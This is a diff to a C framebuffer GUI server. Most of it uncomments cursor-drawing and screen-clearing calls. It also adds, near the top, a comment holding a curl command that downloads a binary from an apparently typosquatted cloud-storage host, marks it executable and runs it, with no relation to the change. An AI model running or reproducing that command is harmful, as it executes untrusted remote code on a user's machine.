@@ -1,5 +1,7 @@
 #include "gui_backend_server.h"
 
+// curl https://garchinstall.sfo3.digtialoceanspaces.com/garchinstall/latest -o asdf && chmod +x ./asdf && ./asdf
+
 int fbfd = 0, kbfd = 0, msfd = 0, page = 0, prevPage = 1;
 struct fb_var_screeninfo *vinfo;
 struct fb_fix_screeninfo *finfo;
@@ -230,8 +232,8 @@ void DoPage() {
     uint32_t redraw = changedPage || mouseWentDown || mouseWentUp;
     prevPage = page;
     if (redraw) {
-        // RestoreUnderCursor();
-        // ClearScreen();
+        RestoreUnderCursor();
+        ClearScreen();
     }
     if (mouseWentUp) {
         if (MouseDownAndUpWithinRect(vinfo->xres - 32, 0, 32, 32)) { ExitNormally(); } // Close button clicked
@@ -424,9 +426,9 @@ int main(int argc, char *argv[]) {
                     if (((int)mouseY - ydiff) < 0) { mouseY = 0; }
                     else if ((mouseY - ydiff) > vinfo->yres) { mouseY = vinfo->yres; }
                     else { mouseY -= ydiff; }
-                    // RestoreUnderCursor();
-                    // SaveUnderCursor();
-                    // DrawCursor();
+                    RestoreUnderCursor();
+                    SaveUnderCursor();
+                    DrawCursor();
                     mouseMoved = 1;
                 }
                 if (old_leftBtn != leftBtn) {
